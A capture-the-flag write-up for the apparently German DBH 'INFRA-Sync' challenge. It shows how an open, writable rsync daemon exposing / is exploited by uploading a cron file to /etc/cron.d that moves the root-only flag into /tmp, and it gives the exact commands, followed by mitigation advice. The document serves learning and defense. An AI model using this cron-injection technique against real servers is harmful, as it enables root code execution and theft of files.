# Sync
#DBH #challenges  #INFRA #hacker #learningplatform 

---
> roothun7er  | Aug 11h, 2025
---
### Description

---

Let's Sync

---
# Report summary

Here you will see a summary of the following topics of the report.

* **Discord stuff**
	* Challenge Bot
	* Challenge Start
* **Challenge Analysis**
	* Summary
* **Challenge start**
	* On your Machine
	* Let's geht started
* **Recon phase**
	* Looking around
* **The Challenge Code**
	* Get entrypoint.sh
	* Get rsyncd.conf
	* Values at this Time
* **Solution**
	* Solution to the Vulnerability (Detailed Path)
* **Solve steps**
	* Preparation for cron job payload
	* Upload payload file
* **Flag**
	* Get the Flag
* **Mitigation**
	* Mitigation Fixes
	* Why Some Vulnerabilities Cannot Be Fully Fixed 

---


<div style="page-break-after: always;"></div>

# Discord stuff

### Challenge Bot

On the Discord-Server from DBH it is an Channel named `# commands-2025`,  klick on it and type the following Command:
```c
/challenge Start
```

Output:
```c
Challenge Panel
Bitte wähle unten eine zu startende Challenge aus

Ausgeführt von <YOUR NAME>
Triff eine Auswahl
```

In the drop down menu Choose: `INFRA-Sync`

Output:
```c
Success
sync wurde erfolgreich gestartet.
Du kannst diese wie folgt erreichen
TCP
nc dbhchallenges.de <YOUR_GIVEN_PORT>

Ausgeführt von <YOUR_NAME>
```

- Copy **YOUR**  given `netcat` command to your clipboard.
----

# Challenge Analysis

Here you will see a summery of my analyses.
### Summary

The challenge presented an **open rsync daemon** running on port <YOUR_GIVEN_PORT> with protocol version 32.  
This daemon exposed the entire root (`/`) file system as a module named `dir`.  
Rsync was configured with `read only = no`, meaning write access was possible, but with a filter excluding the `/root/flag.txt` file from download.  
Additionally, a `cron` service was running, and `/etc/cron.d` could be modified, allowing for code execution as `root`.

This created a privilege escalation path: although the flag file could not be fetched directly, it could be moved or copied to a world-readable location using a malicious cron job.

---


<div style="page-break-after: always;"></div>

# Challenge Start

Here you will find all the things we will do to throw the Challenge start .

- Connecting with `nc` to the target showed infrastructure output.
- Connecting with `rsync` to the target showed a module named `dir`.
- Listing its contents revealed `/`, with typical Linux file system structure.
### On your Machine

Connect  over `netcat` with the following command:
```bash
ncat dbhchallenges.de <YOUR_GIVEN_PORT>
```

Output:
```c
@RSYNCD: 32.0 sha512 sha256 sha1 md5 md4
```

- After i saw this output i knew that tool is `rsync`, a very nice tool: `BTW an pre build tool in KALI`, so in know it very well.
---

### Let's geht started

First of all we try to reach the given `DOMAIN + PORT` directly in `rsync` and saw whats happend with the following Command:
```bash
rsync rsync://dbhchallenges.de:<YOUR_GIVEN_PORT>/
```

Output:
```c
dir             dir path
```

The Output above show's us that the structure is in `dir`, let's take a look what is in there with the following Command:
```bash
rsync rsync://dbhchallenges.de:<YOUR_GIVEN_PORT>/dir
```

Output:
```c
drwxr-xr-x          4,096 2025/08/11 19:10:47 .
lrwxrwxrwx              7 2025/07/21 02:00:00 bin
lrwxrwxrwx              7 2025/07/21 02:00:00 lib
lrwxrwxrwx              9 2025/07/21 02:00:00 lib64
lrwxrwxrwx              8 2025/07/21 02:00:00 sbin
drwxr-xr-x          4,096 2025/05/09 16:50:00 boot
drwxr-xr-x            360 2025/08/11 19:10:47 dev
drwxr-xr-x          4,096 2025/08/11 19:10:47 etc
drwxr-xr-x          4,096 2025/05/09 16:50:00 home
drwxr-xr-x          4,096 2025/07/21 02:00:00 media
drwxr-xr-x          4,096 2025/07/21 02:00:00 mnt
drwxr-xr-x          4,096 2025/07/21 02:00:00 opt
dr-xr-xr-x              0 2025/08/11 19:10:47 proc
drwx------          4,096 2025/08/11 20:35:01 root
drwxr-xr-x          4,096 2025/08/11 19:58:23 run
drwxr-xr-x          4,096 2025/07/21 02:00:00 srv
dr-xr-xr-x              0 2025/08/11 19:10:47 sys
drwxrwxrwt          4,096 2025/08/11 20:42:01 tmp
drwxr-xr-x          4,096 2025/07/21 02:00:00 usr
drwxr-xr-x          4,096 2025/07/21 02:00:00 var
```

- Look's like an Linux root file system interesting.
---


<div style="page-break-after: always;"></div>

# Recon phase

Here you will find all the things we do in the Recon phase.

- Trials to get `/root/flag.txt` failed .
- Found other interesting `entrypoint.sh` to analyse.
### Looking around

MY first intention was the `flag.txt` in the `root` folder, i looked in it with the following command:
```bash
rsync rsync://dbhchallenges.de:<YOUR_GIVEN_PORT>/dir/root/             
```

Output:
```c
drwx------          4,096 2025/08/11 20:35:01 .
-rw-r--r--            571 2021/04/10 22:00:00 .bashrc
-rw-r--r--            161 2019/07/09 12:05:50 .profile
-rwxrwxr-x            178 2025/08/08 18:24:36 entrypoint.sh
```

- NOooooooOOOOOo nothing here, but wait, there is an interesting looking file named `entrypoint.sh` let's look in there!!!!
---


<div style="page-break-after: always;"></div>


# The Challenge Code

Here you will find all the things what has to do with Challenge Code we found:
### Get entrypoint.sh

Let's show what is in this file, download it with the following command:
```bash
rsync rsync://dbhchallenges.de:<YOUR_GIVEN_PORT>/dir/root/entrypoint.sh .
```

Let's look in the file:
```bash
cat entrypoint.sh
```

Output:
```sh
#!/bin/bash

set -ex

cron &
exec rsync --no-detach --daemon --config /etc/rsyncd.conf &

while true; do
  chown root:root /etc/cron.d/*
  chmod 644 /etc/cron.d/*
  sleep 1
done
```

- Verified that uploading into `/etc/cron.d/` creates scheduled root jobs.
---

### Get rsyncd.conf

- Trials to get `/root/flag.txt` failed due to explicit filter.

Let's show what is in this file, download it with the following command:
```bash
rsync rsync://dbhchallenges.de:<YOUR_GIVEN_PORT>/dir/etc/rsyncd.conf .
```

Let's look in the file:
```bash
cat rsyncd.conf 
```

Output:
```sh
uid = root
gid = root
use chroot = no
max connections = 4
syslog facility = local5
pid file = /var/run/rsyncd.pid
log file = /var/log/rsyncd.log

[dir]
path = /
comment = dir path
read only = no
filter = - /root/flag.txt
```

- Oh an flag.txt is present,  my  previous search failed due to explicit filter :D
---

### Values at this Time

Here we see some Values we have at the moment:
- **Target host**: `dbhchallenges.de`
- **Target port**: `<YOUR_GIVEN_PORT>` 
- **Module**: `dir` 
- **Flag location**: `/root/flag.txt` 
- **Writable location for exploit**: `/etc/cron.d/` 
- **Readable location for stolen flag**: `/tmp/flag.txt` 
---


<div style="page-break-after: always;"></div>


# Solution 

Explains the detailed path  of the solution.

By crafting a cron file in `/etc/cron.d/` that runs as root and moves the flag to a world-readable directory (`/tmp`), the challenge restriction was bypassed.  
Once the cron job executed, the rsync client could download `/tmp/flag.txt` normally.

### Solution to the Vulnerability (Detailed Path)

1. **Identify Vulnerability**: Public rsync with write access to `/`
 2. **Understand Restriction**: `/root/flag.txt` blocked via `filter`. 
 3. **Find Execution Vector**: cron running, `/etc/cron.d` writable via rsync. 
 4. **Develop Payload**: cron entry that moves `/root/flag.txt` to `/tmp/flag.txt`. 
 5. **Upload Payload**: Using rsync to place file into `/etc/cron.d`. 
 6. **Wait for Execution**: Cron runs every minute. 
 7. **Download Flag**: After movement, `/tmp/flag.txt` is accessible.
---

# Solve steps

Here you will saw the steps to solve the Challenge.

### Preparation for cron job payload

Local creation of cron payload with the following command:
```bash
echo "* * * * * root mv /root/flag.txt /tmp/flag.txt" > flagcopy
```

### Upload payload file
Upload file and wait a few seconds until the cron job hits and upload the `flagcopy` script to the  target system with the following command:
```bash
rsync flagcopy rsync://dbhchallenges.de:<YOUR_GIVEN_PORT>/dir/etc/cron.d/flagcopy
```

Download  the `flag.txt` after cron job hits from the `/tmp` folder to your attacking machine with the following command:
```bash
rsync rsync://dbhchallenges.de:<YOUR_GIVEN_PORT>/dir/tmp/flag.txt .
```

- Perfect the job is done we exploited the target system <3
---
# Flag

Here we get obviously the FLAG.

### Get the Flag

Watch the wonderful `flag.txt` with the following command:
```bash
cat flag.txt 
```

Output:
```
DBH{n0_fl4g_her3_d0_it_y0u7s3lf_im_n0t_foR_fr33}
```

- Don't be mad at me, ask yourself if you will learn something if you only copy the flag ;)
---



<div style="page-break-after: always;"></div>


# Mitigation

Here are some Mitigation we can do to provide future Problems.

- Never expose `rsync` modules with write access to the public internet.
- Use `read only = yes` unless strictly needed.
- Restrict `path` to specific directories instead of `/`.
- Apply `auth users` and `secrets file` to enforce authentication.
- Ensure cron configuration directories are write-protected from untrusted sources.
- Use `use chroot = yes` to limit file system exposure.
---

### Mitigation Fixes

Here are some Mitigation techniques we can do to solve future problems.

1. **rsync**:
   - Set `read only = yes`.
   - Restrict `path` to non-sensitive areas.
   - Apply IP whitelisting or authentication.
   - Enable chroot jail.

2. **cron**:
   - Limit writable directories for cron jobs to root-only file system, chmod 600.
   - Monitor for unauthorized files in `/etc/cron.d`.

3. **Infrastructure**:
   - Firewall to restrict port <YOUR_GIVEN_PORT> to trusted IPs.
   - Regularly scan for open ports/services.
---

### Why Some Vulnerabilities Cannot Be Fully Fixed 

Some services like rsync inherently expose files for synchronization; misconfigurations can turn this into a full compromise vector.   
Even if fixed, an administrator may require write-access for legitimate purposes, which still poses risk if combined with other services like cron.   
The interplay between multiple services (e.g., rsync + cron) creates composite vulnerabilities — removing one component may not remove the entire attack surface.

---

